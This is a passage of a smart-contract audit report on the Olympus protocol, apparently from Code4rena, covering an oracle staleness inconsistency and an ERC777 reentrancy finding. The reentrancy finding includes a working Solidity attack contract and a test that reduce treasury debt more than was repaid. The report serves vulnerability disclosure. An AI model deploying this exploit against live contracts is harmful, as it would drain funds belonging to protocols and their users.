href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1236240959\">fullyallocated (Olympus) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is possible but will not happen in a production environment because we’re using this for internal testing.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1251636550\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Given the scope of the contracts the wardens were asked to review, I think this issue is valid. While I understand that the <code>voter_admin</code> is trusted, I don’t think users expect the admin to be able to bypass any votes results in this manner. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-inconsistency-in-staleness-checks-between-ohm-and-reserve-token-oracles\" style=\"position:relative;\"><a href=\"#m-18-inconsistency-in-staleness-checks-between-ohm-and-reserve-token-oracles\" aria-label=\"m 18 inconsistency in staleness checks between ohm and reserve token oracles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/391\">[M-18] Inconsistency in staleness checks between OHM and reserve token oracles</a></h2>\n<p><em>Submitted by okkothejawa, also found by datapunk, reassor, and Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171</a><br></p>\n<p>Price oracle may fail and revert due to the inconsistency in the staleness checks.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the <code>getCurrentPrice()</code> of <code>PRICE.sol</code>, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, <code>updatedAt</code> should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that <code>updatedAt</code> should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the <code>getCurrentPrice()</code> reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle’s first multiple of frequency time frame might not be enough and it couldn’t pass the staleness check due to unrealistic expectation of freshness.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review, talking with devs</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the line 171 to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (updatedAt &lt; block.timestamp - 3 * uint256(observationFrequency))</span></span></code></pre>\n<p>like line 165.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/391#issuecomment-1238515996\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This should indeed be the same. We will update to fix.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-trsry-reenter-from-olympustreasuryrepayloan-to-operatorswap\" style=\"position:relative;\"><a href=\"#m-19-trsry-reenter-from-olympustreasuryrepayloan-to-operatorswap\" aria-label=\"m 19 trsry reenter from olympustreasuryrepayloan to operatorswap permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/403\">[M-19] TRSRY: reenter from <code>OlympusTreasury::repayLoan</code> to <code>Operator::swap</code></a></h2>\n<p><em>Submitted by zzzitron</em></p>\n<p>One can repay loan to the treasury with the value from the <code>Operator::swap</code>.</p>\n<p>Condition:</p>\n<ul>\n<li>the reserve token in Operator has hook for sender (like ERC777)</li>\n<li>the debt is the same token as reserve</li>\n</ul>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The below code snippet shows a part of proof of concept for reentrancy attack, which is based on <code>src/test/policies/Operator.t.sol</code>. The full test code can be found <a href=\"https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb\">here</a>, and <a href=\"https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11\">git diff from the <code>Operator.t.sol</code></a>.</p>\n<p>Let’s say that the reserve token implements ERC777 with the hook for the sender <a href=\"https://github.com/d-xo/weird-erc20#reentrant-calls\">(see weird erc20)</a>. If the attacker can take debt of the reserve currency for the attack contract <code>Reenterer</code>, the contract can call <code>OlympusTreasury::repayLoan</code> and in the middle of repay call <code>Operator::swap</code> function. The <code>swap</code> function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the <code>repayLoan</code>.</p>\n<p>In the below example, the attacker has debt of 1e18, and repays 1e17. But since the <code>swap</code> function is called in the <code>repayLoan</code>, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// Mock to simulate the senders hook</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// for simplicity omitted the certain aspects like ERC1820 registry and etc.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockERC777</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\"> () </span><span class=\"mtk11\">MockERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ERC777&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;777&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_callTokenToSend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// _callTokenReceived(from, to, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// simplified implementation for ERC777</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_callTokenToSend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">from</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC777Sender</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokensToSend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC777Sender</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokensToSend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// Concept for an attack contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Reenterer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC777Sender</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">Operator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">entered</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Operator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">op_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">op_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokensToSend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">entered</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// call swap from reenter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// which will manipulate the balance of treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">entered</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e17</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">attack</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OlympusTreasury</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// approve to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">* </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// repayDebt of 1e17</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">repayLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e17</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// the test</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_poc__reenter</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reenterer</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reserveDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reenterer</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// start repayLoan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">reenterer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">attack</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// it should be 9 * 1e17 but it is 8 * 1e17</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reserveDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reenterer</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">8</span><span class=\"mtk1\">*</span><span class=\"mtk7\">1e17</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"cause\" style=\"position:relative;\"><a href=\"#cause\" aria-label=\"cause permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cause</h3>\n<p>The <code>repayLoan</code>, in the line 110 below,  calls the <code>safeTransferFrom</code>. The balance before and after are compared to determine how much of debt is paid. So, if the <code>safeTranferFrom</code> can modify the balance, the attacker can profit from it.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// OlympusTreasury::repayLoan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"112\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"113\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repayLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"114\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">reserveDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TRSRY_NoDebtOutstanding</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"115\"></span><span class=\"grvsc-source\"><span 